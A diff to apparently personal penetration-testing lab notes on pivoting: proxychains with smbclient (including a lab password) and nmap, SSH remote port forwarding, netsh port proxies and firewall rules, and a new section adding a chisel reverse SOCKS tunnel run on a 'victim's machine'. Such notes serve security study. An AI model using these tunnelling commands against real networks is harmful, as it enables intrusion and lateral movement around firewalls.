@@ -130,7 +130,7 @@ cat /etc/proxychains4.conf                                                      
 proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234        \\\\ Same request as the last section, but with proxychain (for Dynamic tunneling)
 proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217                          \\\\ Nmap request with "proxychain"
 ```
-#### SSH Remote Port Forwarding
+### SSH Remote Port Forwarding
 > **netsh** is a tool that manages Firewalls (It might need some administrator privileges to be ran.)
 ```
 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4                        \\\\ "Bind shell" like port forwarding
@@ -141,4 +141,11 @@ netsh interface portproxy show all
 netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
 netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+```
+## Tunneling Through Deep Packet Inspection
+```
+tail -f /var/log/apache2/access.log                                          \\\\ Verifying the logs of Apache2 server
+chisel server --port 8080 --reverse                                          \\\\ To run on the kali machine (server)
+/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &             \\\\ To run on the victim's machine (client)
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
 ```
